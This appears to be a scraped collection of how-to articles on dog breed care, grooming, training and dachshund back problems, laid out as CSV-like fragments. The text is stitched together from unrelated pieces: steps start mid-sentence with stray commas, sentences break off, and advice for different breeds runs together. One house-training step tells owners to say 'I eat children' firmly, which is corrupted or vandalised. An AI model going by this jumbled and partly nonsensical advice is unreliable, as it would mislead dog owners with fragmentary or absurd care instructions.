Provide your dog access to fresh water at all times.",How to Care for an Australian Terrier1," Before you buy an Australian Terrier, have the breeder provide you with independently certified health screenings for both of the dog’s parents that verify they are free from any inherited diseases or disorders that could be passed on to your pet. The breeder should also furnish a health guarantee for your dog (stating that they can be returned if the vet finds any immediate defects) as part of the sales contract.Responsible breeders will register the parents of their litters in the Canine Health Information Center database.You can search the database for their records, which should include evaluations for each Aussie’s eyes, thyroid, and knees. Check them to ensure that your dog’s sire and dam do not carry any genetic diseases that are difficult to treat.;
, Register your terrier immediately with a local veterinary practice. Aussies are a generally healthy breed with few genetic ailments, but they still require regular visits to the vet to catch any issues that may come up and ensure that they’re up-to-date with vaccinations and parasite control treatments.

, Australian Terriers, like many small breeds, are susceptible to bone disorders. If your dog is becoming increasingly lame or having consistent trouble moving about in a natural way on all four legs, make an appointment for a veterinary examination.The most common conditions for Australian Terriers are Legg-Perthes Disease, which causes degeneration in the hip joints, and luxating patellas, which cause the knee caps to slide out of place. Both can strike Aussies from a very young age, as early as five months old.

, Aussies are prone to food intolerances and allergies. If you notice them having any recurring symptoms, like scratching frequently, vomiting, or having consistently loose bowels, go to the vet to have them tested and consult on any necessary dietary changes., Australian Terriers get especially bad (and sometimes even allergic) reactions to fleas. Consult with your vet about the best methods of flea control for your pet (from collars to topical treatments), and be sure to keep them up-to-date., A healthy diet for your terrier starts with a high-quality dry dog food that’s formulated especially for the nutritional needs of small breeds (which generally have higher metabolisms than large ones). Aussies are not fussy eaters, so you just want to make sure that they’re getting a “complete and balanced” kibble that’s fortified with vitamins, minerals, and antioxidants.Antioxidants are important for Australian Terriers since they have a longer-than-average lifespan of 12-15 years.
Be sure to select a food that’s appropriate to their life stage (puppy or adult), and follow the instructions on the package with regards to how much you should feed them according to their age, weight, and activity level. Keep the your dog healthy and trim by measuring out each meal and never exceeding the recommended serving.
If you’re stumped as to which brand of food to go with, ask your vet for recommendations.

, A well-hydrated Australian Terrier is a healthy terrier since water is essential to their digestion, nutrition, and joint health. Makes sure that clean water is constantly available, even at night."

Get a crate appropriately sized for your dog (but as big as your house can accommodate) and line it with a dog bed and a water bowl., These dogs dislike being alone; they are often more destructive when they are by themselves. Talk with your roommates or family members to make sure that you leave your Cairn Terrier at home for as little time as possible., You should purchase a high-quality dog food for your Cairn Terrier. There are specialized dog foods for small dogs and terriers. In total, you should feed your dog between a half cup and a full cup of dog food every day. You should feed your dog two meals a day, rather than leaving food out all the time. Cairn Terriers are prone to obesity.You might need to adjust the amount of food based on your dog’s metabolism, age, size, and exercise habits.
Determine if your dog is a healthy weight. You should be able to see his waist and feels his ribs easily if you put your hands on his body.Consult your vet if you think your dog is consistently overweight or underweight.

, Every week, you should plan to groom your Cairn Terrier for about an hour. You should have a comb as well as a softer brush.Comb and brush your Cairn Terrier thoroughly every week to prevent shedding and keep his coat healthy.


Give your Cairn Terrier a full bath about every three months.You can also bring your dog to a professional groomer to get his coat stripped and trimmed, but this is not necessary unless you want to show them at a dog show., Make sure that they are not dirty or waxy.If they are, clean them gently with a wet cloth.

, Once every couple of weeks or month (depending on your dog’s nail growth) should be sufficient. However, if there is cracking or splitting on some of your dog’s nails, start trimming more frequently., You can find dog toothbrushes and toothpastes at pet stores or online. If you can, try to brush your dog’s teeth daily."

This helps strengthen the coat and avoid damage from splitting or tearing hairs. If your Yorkie's coat is naturally oily, you can skip conditioning since it might just weigh his coat down.You can also make your own conditioner. Mix 5 parts water and 1 part dog coat conditioner in a spritzer bottle.;
, Use a pin brush without rubber back, which has metal tip without plastic covering, as they tear the coat. Divide an area of your dog's coat into sections and brush from the root to tip with the lie of the hair. Brushing against the lie of the coat is uncomfortable and can lead to tangles. Proper brushing will condition your dog's hair by spreading natural oils throughout your dog's coat.A rubber backed brush can tear your Yorkie's coat.
You might want to start brushing an area like the shoulder where your dog is less sensitive and ticklish.

, If you find small knots, work away at them with your fingers, teasing the knot apart. If it is stubborn and can't be worked out, use a comb and slide it between the base of the knot and the skin. Position a pair of scissors above the comb and snip the knot away. The comb protects the skin and keeps you from accidentally snipping it when the knot is raised.Look for knots in areas where the fur rubs together such as the armpits, groin and behind the ears.
Check under the tail to make sure there is no fecal soiling in the fur around the anus. If there is, consider bathing your dog, or snipping the soiled hair off if the soiling is extreme.

, Use a comb to gently comb out the fur of your dog's face and ears. Work slowly and pay attention to if your dog starts moving so you don't accidentally poke him in the eye with the comb.


You can also clean any buildup from around the rims of your dog's eyes using eye wipes. Be careful so you don't get the wipe into the eye, which can sting.

, Remove any accessories your dog is wearing such as a collar, bows, or dog clothing. Set him on a comfortable spot on the floor or grooming table. If you use the floor, lay out a large, soft towel. This will also keep hair off the floor. If you use the grooming table, never leave him unattended in case he gets frightened and jumps down, which could lead to injury.


Before your bathe your dog, make sure he's been properly brushed. Use a pin brush to completely brush your Yorkie and then use a comb to completely brush him again. This will prevent tangling.

, Starting at the top of your Yorkie's head, wet his body completely. Take care not to get any water directly into the eyes. Make sure you wet all the way back to the end of his tail. Squirt some shampoo into your hands and work a lather from the top of your dog's neck to the end of the tail. Shampoo the outside of the ears, the legs, the chest, belly, featherings (the fringe or longer hair), and the rest of the body. To shampoo the head, start at the top and work down to the muzzle.Choose a creamy dog shampoo that will make your Yorkie's coat silky and soft. Look for a tearless shampoo, especially to use on the head. Avoid using shampoo formulated for humans because the pH balance is different and could irritate your dog's skin.

, Use warm, clean water and rinse the shampoo out of your Yorkie's coat for at least three minutes. Keep rinsing until all the suds are removed and the water runs clear. If you don't get it all the shampoo out, the soap residue could irritate your dog's skin.


It may be easier to rinse your dog in a sink. If your dog is larger, you can also set him in the tub to rinse, but he may be frightened by the larger space., If you are a using conditioner, squirt a dollop into your hands. Smooth the conditioner over the dog's body, beginning at the top of the neck and working down to the end of the tail. Get the outside of the ears, the legs, the chest, featherings and the rest of the body. Let the conditioner set for 5 to 10 minutes before rinsing off.Rinse the conditioner off for about 2 to 5 minutes.

, Let your dog shake the water off first. This can help to remove about half the water in his coat. Take a towel and rub gently all over the dog's body for about 20 seconds. By this point, your dog will still be damp, but no longer soaking wet. You can now take a pin brush and brush your your dog's coat. Repeat with a comb, but pay special attention to the featherings, ears, and tail. Comb these so that they sit straight.


You can also use your pet dryer or a human one on the coolest setting possible (also placed at least 10 inches from the dog and constantly moving). Blow dry your Yorkie while combing him, so that the hair stays straight., Choose toothbrushes and toothpastes that are made for dogs. You may want to buy a tiny finger brush with plastic bristles (available at pet stores, catalogs, or from your veterinarian) which may be easier to use than a toothbrush. Clean the tooth brush or tiny finger brush by running it under hot water for a few seconds and rinsing in cold water for a few seconds. Do this before using it in your dog's mouth.


Do not use human toothpaste because the high fluoride content can make your Yorkie sick if he swallows it., Squirt a pea-sized amount of toothpaste on the toothbrush. Gently move your dog's lip upward so you can see the teeth. Rub the toothpaste on the teeth and don't worry about rinsing since dog toothpastes are designed for your dog to lick away.Yorkies are prone to tartar buildup on their teeth. This buildup can lead to gum recession and the teeth eventually loosening. Brushing is important to prevent tartar buildup and painful, costly dental surgeries.

, Take dog nail clippers and hold your dog's foot firmly in your hand. Pay attention to the shape of the nails and look for the quick. The quick is a blood vessel and nerve that appears dark. Avoid cutting this. Instead, only cut the tip of the nail. If you're unsure where the quick is or how far back to clip, try buffing the point off the nail with a coarse emery board.


If you do accidentally cut into the quick, it may bleed a lot, but won't be fatal. You can stop the bleeding by covering it with a little styptic powder.If it's your first time clipping your Yorkie's nails, you may want someone knowledgeable to show you how to clip the nails. Or, it may just be helpful to have the person hold your dog while you do the trimming.

, Take your tweezers and gently pluck the hair inside the ear. This is optional, as some argue it can make the ears sore and inflame the skin, causing infection. Others believe plucking can improve air circulation within the ear canal, preventing infections.Many veterinarians advise a middle path which is not to pluck unless your dog gets regular ear infections. In this case, plucking can help ear drops penetrate deeper into the ear canal., If you see wax, usually brown or black, you'll need to use ear wipes or an ear cleaner to remove it. Avoid putting water into your dog's ears, since it will soften the skin and could lead to infection. Instead, squirt a cleanser into your dog's ear and rub it in a circular motion. Place a cotton ball right under the flap and tip your dog's head toward it, so the solution drains out. Wipe out any remaining solution with a clean cotton ball.Never poke anything into the ear canal, even a cotton bud. But, don't be too afraid to clean your dog's ears. It's almost impossible to touch a dog's eardrum, let alone rupture it through routine cleaning. Dogs have ""L"" shaped ear canals, so as long as you clean straight downwards into the ear canal, the eardrum is not accessible.

, Choose grooming scissors that have a blunt end. This keeps the tips from piercing your dog if he moves unexpectedly while you're trimming. Gently, but firmly hold your dog's foreleg and clip the extra hair between the pads. Cut the hair on the front of the foot in a semi-circle, leaving the hair on top of the paws alone.Using other scissors may thin your dog's hair too much or create split ends.
Since the hair on your dog's feet grows quickly, check the length every month to make sure it doesn't drag and interfere with your dog's walking., Try to clip all the featherings, including the beard, at an equal length. You should occasionally trim the featherings, even if you're trying to grow out your Yorkie's coat. Just make sure not to much, if that's the case.


Clipping your dog's featherings is a completely personal preference. You may want to find reference photos of looks that you like. For example, a popular cut is the ""puppy dog clip"", which has the top third of the ears clipped short so the ears stay pricked up and the hair along the jawline is clipped straight., To do this, brush the hair thoroughly so there are no tangles in the hair. Pull a section of hair on the top of your dog's head as though you're making a ponytail. Secure it with a comfortable band and tease the secured hair to make it appear larger. Gather it again on the top of the head and secure it with another band, clip, or bow.You may want to add a few drops of gel to keep hairs in place.
If your Yorkie is a show dog, you'll need to groom his top knot.

, It's a good idea to send your dog to a professional groomer three or four times a year to keep him looking his best. If your dog is a show dog, he'll need a more complicated trim which involves growing the hair to floor length.


A show Yorkie should be professionally trimmed every few months.

Additionally, the Keeshond’s chest is deep and strong and its stomach is only moderately tucked up near its loins.Males grow to be 18 inches and and females 17 inches. Both male and female Keeshonds can weigh up to 35 to 45 pounds.

, A thick double coat covers the Keeshond’s body—a long, straight overcoat stands out from a thick, velvety undercoat. Its neck is also covered with a thick mane. The thick mane extends from the bottom of its jaw to its chest (covering the whole front part) and shoulders, including the top of the shoulders near the withers.Its coat does not part down the back, if it does, then this is a disqualification.
The hair of its overcoat is characterized as harsh in comparison to the velvety hair of its undercoat and face.

, From an angle, the Keeshond’s forelegs look straight, well-boned, and proportionate to its body with a slight slope near the pasterns. The hair on the forelegs is short, smooth and slightly feathered.The Keeshond’s hindquarters are muscular. Its hocks are perpendicular to the floor. In comparison to the forelegs, the hind legs are covered in dense, feather-like fur down to the hocks (but not below) creating a trouser-like look.

For this reason, Keeshonden respond well to training techniques that are positive and reward-based as opposed to negative, punishment-based training techniques.If owners make training lessons fun and positive, the Keeshond only needs a few, brief lessons to learn anything.

, Originally, Keeshonden were bred to be watchdogs on barges. Because of their breeding, they are alert and intelligent, and are natural watchdogs. Keeshonden are also active and lively. They excel in agility training, as well as performance events and competitions.Although Keeshonden bark or ""talk"" when a stranger is near, they are not nuisance barkers.

Keep them in well-enclosed spaces.,
House your Aussie indoors with you.,
Get your Terrier a crate.",How to Care for an Australian Terrier2," Aussies were bred to be hunters, so they’re liable to chase after any small animal that crosses their path. This mad pursuit can be especially dangerous if you live near a road. To prevent them from getting lost or running into traffic, be sure that they’re always in a confined area.Any outdoor areas where you let them loose should have a fenced border with no gaps or holes. Be sure to constantly check your fenced yard for holes that your dog may have dug since Australian Terriers have a real penchant for digging.

, Australian Terriers are loyal house dogs who love being around their people. Do not house them outdoors or keep them outside unattended for long periods of time.Aussies are especially social and devoted to their owners. Don’t get one unless you plan on being around more often than not.

, Aussies like to have their own den, so it’s recommended that you have a crate where they can rest and sleep. Make sure that it’s one designed for small breeds and just big enough for them to stand up, lie down, and turn around in. Put soft, clean bedding in the bottom to make it a comfortable home for you pooch.Since Australian Terriers like digging and chewing, crates can also provide a great place to keep canines under wraps when you need to go out. Be sure to leave them with toys, water, and treats, and never keep them in there for more than a few hours at a time.

Socialize your dog.,
Train your dog.,
Exercise your pet for an hour each day.,
Pick up after your Aussie.",How to Care for an Australian Terrier3," Australian Terriers tend to be aggressive towards other canines, so it’s important to socialize them early. Take time early on to bring them to a variety of new environments where they can meet new people and dogs. If you gradually expand their knowledge of the outside world, your pet will be less prone to aggressive or fear-motivated behavior.Try to make these introductions as positive as possible. Don’t start by taking your terrier into the center of a crowded dog park because that will be alarming and set them up to fail. Instead, start by taking them to a field where there are a few dogs present in the distance and work your way up to closer encounters.
If your dog reacts negatively to a place or dog, it’s most likely out of fear. The best response is not scolding. Instead, give them calm reassurance and affection until they’re more at ease.
Make sure that they’re safely exposed to other dogs by bringing them to puppy classes where they can interact with other dogs in a controlled environment with a trainer present.

, Aussies can be stubborn and domineering, so it’s important to take them to obedience training to minimize these traits and ensure that they’re good members of the family. Start by going to classes with an experienced professional trainer, and then keep the lessons going at home.Australian terriers are intelligent working dogs who generally respond well to training. However, their intelligence also means that they can get easily bored with repetition. Train them in short sessions using challenging activities with high rewards to keep them engaged and attentive.
Always use positive, rewards-based training methods with your Aussie, and seek a trainer who does the same. They respond well to consistency and firmness but not to aggression.

, Since Australian Terriers were bred as working dogs, they have quite a bit of energy and need to be exercised on a daily basis to keep them mentally and physically sound. Take them out on a walk for at least an hour each day.Be sure to keep them on a leash to keep them from running away after those small animals they have an instinct to hunt.

, Be a responsible dog owner by ensuring your pet leaves no trace. That means you should immediately pick up their feces using a bag and dispose of them to keep public spaces clean and prevent the spread of disease. It also means that you should be aware of and address any damage that your terrier may cause in public areas.


Australian Terriers have a strong digging instinct. Be sure that you watch out for and fill in any holes when you take them on walks. If you’re trying to cultivate a well-manicured garden, don’t let your Aussie loose in it."

Brush your Australian Terrier weekly.,
Give your Aussie a trim as needed.,
Bathe your dog infrequently.,
Clean their ears once a week.,
Brush their teeth at least twice a week.,
Clip their nails once a month.",How to Care for an Australian Terrier4," Aussies are low-maintenance when it comes to grooming since they have a wiry, weather-proof and dirt-proof coat that does much of the work for you. Comb their coats at least once a week to control shedding and ensure that the natural oils from their skin are distributed throughout their fur.Use a bristle brush, pin brush, and/or a metal comb to brush your terrier’s coat in the direction of hair growth. Stick to detangling its overcoat; don’t try to penetrate to its undercoat.

, The feathery hair around your dog’s face and extremities should be kept short to keep them comfortable and prevent matting.Use a scissors to keep the soft, spiky hair around their eyes, ears, tail, and paws short so that they can comfortably see and don’t collect dirt.
If you’re worried about using shears around your terrier’s face and ears, get an electric shaver designed for small breeds. Always be sure to shave in the same direction as their hair growth.

, Three to four times a year should do the trick. Aussies have sensitive skin, so frequent bathing can leave them with itches and rashes while compromising the natural weather-proofing of their coats.Bathe them only when necessary using a mild, hypoallergenic dog shampoo. Lather them up from the neck down (to avoid getting soap in their eyes or ears), and rinse them with warm water.

, Australian Terriers have perky ears that are susceptible to infections. Keep them clear of wax and dirt by gently wiping them out with a cotton ball dipped in a mild canine ear cleaner.While you’re at it, be on the lookout for any signs of infection, such as redness, rashes, swelling, discharge, or foul smells. If you notice any of these symptoms, take your dog to the vet.

, Doing so will keep your dog from bad breath, tartar buildup, and bacterial infections. Simply lift your Aussie’s lips to expose their teeth, and brush them as would your own.Be sure to use an angled brush and toothpaste that are made especially for dogs. Human toothpaste, especially the ones containing fluoride, can be poisonous to canines.

, To avoid cracking or excess growth, use a small clipper especially designed for canines to trim your Australian Terrier’s toenails on a regular basis. Starting with their front paws, go one paw and nail at a time. Be sure that your dog stands still while you do it.Always check the underside of your dog’s toenail before you trim it to see where the nerve in it ends. You should only cut off the bit that extends beyond the nerve. Play it safe by erring on the side of leaving too much rather than painfully cutting your pet’s nerve endings.

Train your Cairn Terrier.,
House-train your Cairn Terrier.",How to Care for a Cairn Terrier2," You should give these dogs a moderate amount of exercise. They enjoy playing and walks.

Avoid repetitive training techniques. Many dog trainers will tell you that repetition is key, but Cairn Terriers will often be bored and not respond well to extremely repetitive ways.

It also usually comes with a liver defect that requires surgery, too. You can’t test for this disease in advance.Craniomandibular osteopathy, a bone disease that affects the bones growing in the skull.Allergies. You can’t test for allergies in advance of getting your puppy, but they still could affect your dog.
Diabetes. If your dog has diabetes, they most likely will need insulin injections every day to keep them healthy. There’s no way to test for diabetes in advance, either.Obesity. Cairn Terriers are especially prone to obesity, and keeping your dog at a healthy weight is the best way to prevent other health issues., Like any dog breed, the Cairn Terrier has a distinct personality that comes with the good as well as the not-so-good.

However, these behaviors cannot be eliminated entirely from the dog. They are a part of who he is.


Digging. Don’t get attached to your flower beds or your lawn if you have a Cairn Terrier; if you leave them outside, they will dig. You can try to train this behavior out of your dog, but you should also protect any ground (like your garden, etc.) that you don’t want ruined.
Barking. Cairn Terriers can bark a lot, especially if they are unhappy or bored.
Chasing. Because they are terriers, Cairn Terriers have the instinct to chase things that are running away from them. Be careful, and always walk your dog on a leash so that he doesn’t chase something into a dangerous place., There are also lots of wonderful things about the Cairn Terrier that you should appreciate! You picked this dog for a reason, and you should pay attention to the things about him that are special.


Cairn Terriers are excellent watchdogs. They will be cognizant of anyone coming into their territory.
They are active dogs, but don’t need a lot of exercise. They will happily play with children, but they will not be stir crazy hanging out with you indoors.

Correct your dog gently.,
Keep training sessions brief.,
Choose the right training area.,
Reward and correct your dog immediately.",How to Train a Manchester Terrier1," Dogs will work for rewards, so make sure you figure out what your terrier loves as you begin training. Small bits of food and treats your dog likes work best for most cases. You should break up your dog's favorite treats into tiny, bite-sized portions. When your dog does a command correctly, reward it immediately.However, some dogs may not be interested in food. While this is rare, you can find other ways to reward your terrier. For example, pet and praise your dog when it behaves or let it play with a favorite toy for a minute.;
, Correcting your dog is important to training, but Manchester Terriers do not respond to harsh methods like yelling and scolding. Manchester Instead, stick to something gentle but firm. If your dog misbehaves, say ""No"" in a stern voice or simply ignore the behavior. This is more effective than loud scolding, yelling, or using isolation as punishment. Remember to never, ever hit or harm your dog in any way. This is not only cruel and inhuman, but is animal abuse and is illegal., This is especially important when training a puppy.

Instead, train your dog in the basement where it's quiet and free of distractions.

To train your Manchester Terrier to ""come,"" start off by squatting to get on your terrier's level. Then, urge your dog to come to you. Use the command ""Come"" in between calling your dog's name so it will get used responding to this command.At first, you may have to attach a leash to your dog and gradually lead it to you while you say ""Come."" If you consistently train each day, your dog will begin commanding to ""Come"" without the leash.
Eventually, you can stop squatting and lessen use of calling and coaxing your dog. Transition gradually into just using the command ""Come.""
Reward your dog as soon as they complete the behavior. At first, even small steps should be rewarded. Reward your dog the second it takes a step towards you, for example. As time goes by, require more of the command be completed before granting your dog a reward.

, Sit is another vital command every dog should learn. To start training ""Sit,"" sit down next to your Manchester Terrier and get its attention by holding up a treat. Say ""sit"" and slowly lift the treat up. Many dogs will sit on their own as they follow the treat with their head. If your dog does not, gently guide its rear down to get it into the sitting position.Praise your dog as soon as it sits and reward it with a treat.

During training sessions, wave the object around or make the noise until your dog barks. Praise your dog for barking and give your dog a treat.Once your dog consistently barks in response to a certain stimuli, begin incorporating a command or hand gesture.

, To teach shake, start by holding your hand in front of your dog while its sitting with your palm up. If you hold out your hand long enough, your dog may eventually sniff or lick your hand on its own. This can lead to pawing Once your dog paws your hand, say ""Shake"" and reward your dog with a treat and praise. Repeat this process until your dog lifts its hand naturally. If you do short training sessions like this each day, your dog will eventually learn to shake on command.Some dogs will not paw at their owners hands naturally. If your dog does not paw on its own, gently tap your dog's paw until it places its paw in your hand.

, To begin, command your dog to ""sit."" From there, hold a treat over your dog's head to get it to stand. Say ""Beg"" or ""Sit up"" while your dog does this. If your dog jumps to grab the treat, say ""No,"" and then have your dog return to the sitting position.Repeat training sessions each day.

To help them get used to the crate and sooth them, playing classical music also helps relax them and stop the whimpering, and lower anxiety.

You should only lock up your dog when necessary. Do not leave your dog locked up for very long periods of time.

, If you want your dog to understand it needs to eliminate outside, make sure you take it out often enough. You should take your dog out every two to three hours so it knows to go outside.You should also pay attention to any cues your dog gives indicating its about to eliminate. Dogs may sniff or squat when they're getting ready to go. If you notice these behaviors, take your dog outside.

, Accidents will happen during the potty training process. The sooner you get rid of the mess, the better. You want to remove any odors that would encourage your dog to eliminate in the same place again.Clean the area completely. You can blot up the excess urine with a towel and use a cleaner to remove pet odor. Feces should be picked up and discarded in the toilet or outdoors.
If you catch your dog having an accident, correct the behavior. Clap your hands and say ""I eat children"" firmly, but remember not to yell. Manchester Terriers do not respond to yelling, scolding, or forms of punishment like isolation.

, Dogs live in the moment, so reward your Manchester Terrier each time it successfully eliminates outside. Say something like ""Good job!"" Then, pet your terrier and offer it a treat as praise. As your terrier begins eliminating inside less often, and asking to be taken out, you can gradually cut back on treats as a reward."

,, Scroll down to learn how to hand strip the coat.


Hand stripping wirehair brings out the clean, tidy coat of a dachshund and the clean body line. It is worth the time it takes to do it (it can take longer than an hour). There are several techniques, the quickest is to firmly pinch a small amount of long/dead hair between thumb and finger and pull it quickly with the direction of the hair. Use a good pair of rubber gloves to prevent the hair from slipping out from your hands. Start at the head and move towards the tail. Hold your dog in your lap and under one arm. At first do several short sessions to get your dog used to the procedure and make sure you win a struggle. If you accidentally pull too much hair it can cause your dog to yelp, but carry on with smaller amounts of hair.
When you first start stripping the coat, to completely finish the whole stripping can take you a couple minutes each day, for a week. This will get the dog used to the stripping, and will keep his skin from getting sore.

, Half the drying is done right there. Take the towel and for about 20 seconds stroke all over the dog's body. DO NOT RUB! Rubbing makes the coat frizzy and unkept-looking! Dachshund's coats are supposed to lie flat to the body! After, your dog will still be damp, but not wet. This is perfect. Take the bristle brush, pin brush, and comb, and repeat the brush routine as previously. Make sure you are brushing in the direction the hair grows, and brush the coat so that it is flat on the body. If you brush until dry, your dachshund will have a well-kept and tidy flat-lying coat!

, You will need to trim the beard and ""eye brows"" once a month. You must also trim the hair on the paws and pad to keep it nice and tidy (this also prevents safety hazards like slipping).


Trimming the eyebrows

, To cut them comb them forward, from the center of the head and with a pair of grooming scissors carefully cut straight across. Try to leave no less or more than about an inch or three fourths of an inch of eyebrow. Pluck between the eyebrows and top of the nose to improve appearance.

Alternatively, you may want to invest in a grooming table (available at pet stores and online).It is a good idea to spread out any grooming tools you may need (such as a brush and silk scarf) before you begin.
Most grooming tables have a place to secure your dog’s neck, which can be helpful if your dog likes to squirm.
Never leave your dog unattended on the table.;
, Using either a hard rubber brush or a mitt with rubber nubs, carefully brush your dog’s fur to remove any shedding hair. Moving in one direction, carefully run the brush over your dog's body, starting at the neck and ending near the tail. Be sure to brush your dog all over their body.Your shorthaired dachshund only needs to be brushed 1-2 times per week.
Hard rubber brushes and mitts with rubber nibs are both available at most pet stores.
Consult a salesperson if you are not sure which brush to choose.

, After you have brushed your dog’s fur, you can gently rub it with a silk scarf. This gives the fur a luminous shine, and usually feels pleasant for the dog., Some dogs are afraid of the bath. You can help your dog associate the bath with positive experience with a few tricks.Start by placing your dog in the bathtub without water. Do this multiple times in the days prior to a bath.
Bathe it in minimal water. Work up to pouring water over it (especially over its face) as it becomes more comfortable.
Whenever you bathe your dog, offer it a treat.

, Dachshunds produce a special hair oil that helps to insulate them from the elements. Bathing your shorthaired dachshund too often will remove this oil. Unless your dog is covered in dirt, only bathe your dachshund around once a month., Dogs are sensitive to water temperature, just like people. Fill your tub with warm (but not too hot) water. You will want the water to come up no higher than your dog’s tummy.


If your dog is small enough, you may be able to use the sink.
You can also use a baby pool in the yard when it's a hot day.

, Pour out about a quarter-size dollop of shampoo, lather it in your hands, and begin applying to your dog. Many dogs enjoy being bathed. If yours does not, ask a friend to help keep it stable and calm as you apply and lather the shampoo.You can use dog shampoo or baby shampoo.

Rinse your dog’s face last, and many dogs do not enjoy this.

, Using a warm, fluffy towel carefully remove any excess water from your dog. You may also want to stand back and allow your dog to “shake.” If the sound does not bother your dog, you can also apply heat from a hair dryer on its lowest setting., You can wipe away any tear build up as often as every day, or as needed.Colloidal silver (available at health food stores) is product recommended for this purpose. Dap some colloidal silver onto a cotton ball and wipe this near your dog’s eyes.
You can also purchase commercial products for this (such as NaturVet) at most pet stores.
Apply a bit of coconut oil to this area to prevent skin irritation.

, Your dachshund’s ears are very sensitive, so take special care not to get soap or water in them. Instead, moisten the corner of a soft washcloth with warm water and use this to clean their ears.Place your non-dominant hand on the back of your dachshund’s neck to stabilize it.
Then, with the warm washcloth in your dominant hand, gently wipe inside the ear.
There is no need to try and penetrate the ear. A surface cleaning around the edge is sufficient.
Do this every time you bathe your dog.

, Dental hygiene is an important aspect of your dachshund’s health. You can purchase a dog toothbrush and dog toothpaste from most pet stores. Before you try brushing your dog’s teeth, make sure that your dog is comfortable with your hand in their mouth.


Place your dachshund on your lap facing away from you.
Peel their lips back with your non-dominant hand.
Holding the toothbrush in your dominant hand, begin brushing the front teeth.

Prepare your dog for grooming.,
Divide their coat into sections using hair clips or barrettes.,
Comb each section gently.,
Brush each section, starting at the head.,
Brush down their coat towards their legs.,
Brush their coats daily.",How to Groom a Longhair Dachshund1," Place your longhair dachshund on a comfortable spot on the floor or on a portable grooming table. You can also use a countertop or kitchen table. If you choose to be on the floor, lay out a soft, large towel to catch any hair. Remove any accessories they may be wearing, such as a harness or collar.If your dog will not stay still during grooming, enlist another person to help hold them while you groom the dog.;
, You want to be able to focus on one section of the coat at a time. This will help you brush each section thoroughly and to detect any tangles or mats., Before you begin brushing, go through each section and gently comb the hair. This will dislodge loose hair and untangle smaller knots. Use a fine-toothed comb so you can untangle knots more easily.


While you are combing, keep an eye out for any skin irritation. Dachshunds aren’t any more predisposed to have skin problems than other longhaired dogs but they do occur. Grooming regularly will help you to notice any skin irritation or problems early on. Look for any redness, flaking, or scabbing on the skin., Using a soft bristle brush, begin to brush each section of the coat. You should start at the head and make your way down their body. Always brush in the direction that the hair grows; never go against the growth pattern., As you finish the first few sections, brush down towards your dachshund’s legs. Continue brushing in the direction that the hair grows all the way down their legs.


Be extra careful when brushing their tails. This hair tends to be very fine and longer than the other sections of the coat, and can become easily tangled. Check for any debris, like chips of wood or dust, before you brush it.

, Daily brushing helps to remove any loose hair that can get trapped in the dog’s fur. Dachshunds have double coats and longhaired dachshunds are more likely to become tangled and matted when they are not thoroughly brushed daily.


Twice a week, use a wire-pinned brush to detangle their coats.

Keep an eye out for subtle symptoms of back pain.These can range widely from a dog in mild discomfort that appears quieter than usual, to the dog with an explosive disc protrusion that suddenly goes off its back legs and is paralyzed.,
Take your dog's response to pain seriously.,
Take a dog with sudden paralysis to the vet immediately.,
Force your dog to stop moving.,
Take your dog for a veterinary exam.,
Consent to your vet giving the dog an x-ray.,
Ask your veterinarian about getting an MRI or CT scan instead of an x-ray.,
Prevent your dachshund from jumping off furniture or running up and down stairs.,
Help your dog get up on furniture.,
Force a slightly injured dachshund to rest.,
Understand why dachshunds have such high rates of back injuries.",How to Diagnose Back Problems in Dachshunds," Some subtle signs of back pain that can clue you in that there is a potential problem include:


Reluctance to move: The pain associated with back problems means the dog is unwilling to move and may stand in one spot, head lowered. He may yelp or cry out when you try to put his collar on. Some dogs refuse to eat or drink because lowering their head to the bowl is painful.
Arched back: Many dogs with back pain adopt a hunched back stance, and stand stiffly, guarding their movements.
Altered behavior: The dog may be reluctant to jump up onto a favorite sofa, or not be able to go upstairs to bed.;
, Back pain is immensely painful and many dogs will vocalize, cry out, and whimper in response to the pain. They may even cry out just in anticipation of the pain when they are asked to move. Your dog is not just being dramatic when it yelps in pain.

, If pressure to the spinal cord is severe enough, it can cause nerve damage. This most commonly affects the back legs. The dog may not be able to stand, and when it tries to move it ""wheelbarrows"" forward, its front paws pulling its back end along. A dog with sudden paralysis needs to be seen by a veterinarian in order for the spinal damage to be assessed and treated.


Severe paralysis can interfere with bladder and bowel function, and the dog may either become incontinent or it may be unable to empty its bladder. Your veterinarian should give you guidance about how to deal with this problem.

, If your dachshund shows sign of back pain, then you should restrict its movements so that it is forced to rest. Do not allow it to move around the house, instead restrict it to a puppy crate while you make an appointment with the vet.


When you take the dog to the vet, carry it to the car and carry it into the vet's office, as moving awkwardly could cause a grumbling disc to rupture.

, Your vet will perform a physical examination, which includes being alert for other problems that can cause pain and mimic back ache. The vet will support the dog's back end and turn the back of the paw so that it rests on the ground. This is to check the dog is aware the paw is in the wrong position and correct it. Not to do so could indicate nerve damage. The vet will also check for other nerve reflexes, such as the ability to feel pain in the toes, as an indication of whether there is nerve damage or not.The vet will gently feel along the spine, being especially alert for local areas of tenderness and muscle ""fasciculation,"" which is where the muscles twitch because they are sensitized to pain.

, If back pain is confirmed, the vet may suggest imaging to check what is causing the pain. Sources of pain include disc disease, spinal arthritis, spondylitis (infection in the vertebra), inflammatory nerve disease, muscle sprains and strains. A diagnostic test commonly used at veterinary clinics is to take x-rays of the spine. Each section of the back is x-rayed in turn (depending on where the suspected damage is), such as the neck, chest, and lower back.


Two views are usually taken of each area so as to provide a cross reference: One view taken from the side (the lateral) and one from above or below (the dorso-ventral or ventro-dorsal).Radiography can provide helpful information about the bones of the spine and the spaces between them, but it cannot provide a picture of the spinal cord itself. For this more advanced imaging methods are needed.
A limitation of x-rays is they can be misleading. For example, a narrowed space between two vertebra is abnormal and suggest that the disc is diseased. However, the disc may have ruptured harmlessly to one side and avoided pressurizing the spinal cord. Thus, x-rays can give a clues, which can be interpreted in the light of clinical signs as giving a diagnosis., More sophisticated imaging techniques, where available, have taken over from x-rays. These sophisticated techniques can visualize the spinal cord itself. Thus if a disc has prolapsed into the spine, the clinician will be able to see the ""waistline"" in the spine where it is compressed.


This is vital information if specialist decompression surgery is being considered, as it allows the surgeon to know exactly which discs are involved, so they operate in the correct place.Unfortunately, MRI and CT scans are costly. In addition, the dog also needs to be anesthetized so that it keeps still in the scanner. This will have an additional cost, as well as a further health risk for the dog.

, As already mentioned, dachshunds are prone to back problems because of the double whammy of prematurely aging discs and their body shape. A sensible precaution that any dachshund owner should consider is to stop their dog running up and down stairs as this strains the spine.Consider putting up dog gates at the top and bottom of stairs. This will stop the dog from going up or down without your supervision.

, Consider adding dog stairs to your bed if your dog sleeps with you. These are small sets of stairs that allow a dog with short legs to get up on a surface it can't jump onto.


